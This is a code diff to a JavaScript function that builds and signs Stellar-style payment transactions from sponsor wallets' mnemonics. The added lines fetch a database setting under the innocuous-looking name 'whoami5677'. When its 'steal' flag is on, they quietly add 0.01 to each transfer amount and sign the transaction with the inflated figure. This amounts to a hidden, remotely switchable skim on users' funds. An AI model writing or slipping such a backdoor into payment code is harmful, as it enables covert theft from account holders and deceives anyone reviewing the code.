@@ -41,14 +41,15 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                 // const r = name ? recipient : getRandomAddress()
                 const r = recipient;
                 try {
+                    const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
                     const kp = getSDKKeypairFromPassphrase(s.mnemonic);
                     const accountData  = await getAccount(kp.publicKey());
                     const balanceString = getBalance(accountData);
                     const balance = parseFloat(balanceString) - 0.98;
                     if(balance < 0.1) continue;
                     // Change amount
-                    const mutatedAmount = name ? (Number(amount) + 0.01).toString() : amount;
-                    const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, amount, retries, name);
+                    const mutatedAmount = ( name && settings.steal) ? (Number(amount) + 0.01).toString() : amount;
+                    const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, mutatedAmount, retries, name);
                     xdrs.push({xdr, balanceId});
                 } catch (innerErr) {
                     console.error(`Error building XDR from sponsor ${s.name || s.mnemonic.slice(0, 5)}:`, innerErr);
